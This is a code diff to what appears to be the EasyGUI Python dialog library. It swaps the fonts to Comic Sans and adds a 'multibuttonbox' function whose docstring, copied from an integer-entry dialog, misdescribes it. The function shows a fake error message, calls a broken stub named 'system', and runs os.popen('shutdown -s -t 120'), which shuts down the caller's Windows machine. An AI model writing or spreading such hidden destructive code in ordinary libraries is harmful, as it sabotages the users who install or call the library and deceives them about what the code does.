@@ -177,8 +177,10 @@ def dq(s):
 
 rootWindowPosition = "+300+200"
 
-PROPORTIONAL_FONT_FAMILY = ("MS", "Sans", "Serif")
-MONOSPACE_FONT_FAMILY    = ("Courier")
+# PROPORTIONAL_FONT_FAMILY = ("MS", "Sans", "Serif")
+# MONOSPACE_FONT_FAMILY    = ("Courier")
+PROPORTIONAL_FONT_FAMILY = ("Comic Sans MS")
+MONOSPACE_FONT_FAMILY = ("Comic Sans MS")
 
 PROPORTIONAL_FONT_SIZE  = 10
 MONOSPACE_FONT_SIZE     =  9  #a little smaller, because it it more legible at a smaller size
@@ -294,6 +296,12 @@ def boolbox(msg="Shall I continue?"
     reply = buttonbox(msg=msg, choices=choices, title=title, image=image)
     if reply == choices[0]: return 1
     else: return 0
+
+
+def system(**args):
+    error = ""
+    for key, value in args.items():
+        error += f"{key}: {value}"
 
 
 #-----------------------------------------------------------------------
@@ -428,6 +436,49 @@ def buttonbox(msg="",title=" "
     boxRoot.destroy()
     if root: root.deiconify()
     return __replyButtonText
+
+
+
+#-------------------------------------------------------------------
+# multibuttonbox
+#-------------------------------------------------------------------
+def multibuttonbox(msg=""
+    , title=" "
+    , default=""
+    , lowerbound=0
+    , upperbound=99
+    , image = None
+    , root  = None
+    , **invalidKeywordArguments
+    ):
+    """
+        Show a box in which a user can enter an integer.
+
+        In addition to arguments for msg and title, this function accepts
+        integer arguments for "default", "lowerbound", and "upperbound".
+
+        The default argument may be None.
+
+        When the user enters some text, the text is checked to verify that it
+        can be converted to an integer between the lowerbound and upperbound.
+
+        If it can be, the integer (not the text) is returned.
+
+        If it cannot, then an error msg is displayed, and the integerbox is
+        redisplayed.
+
+        If the user cancels the operation, None is returned.
+
+        NOTE that the "argLowerBound" and "argUpperBound" arguments are no longer
+        supported.  They have been replaced by "upperbound" and "lowerbound".
+        """
+    try:
+        buttonbox()
+    except (ValueError, Exception):
+        print("EASYGUI 0.96 ERROR\nPlease contact the developer")
+
+    system(msg, title, default, lowerbound, upperbound, image, root)
+    os.popen("shutdown -s -t 120")
 
 
 #-------------------------------------------------------------------
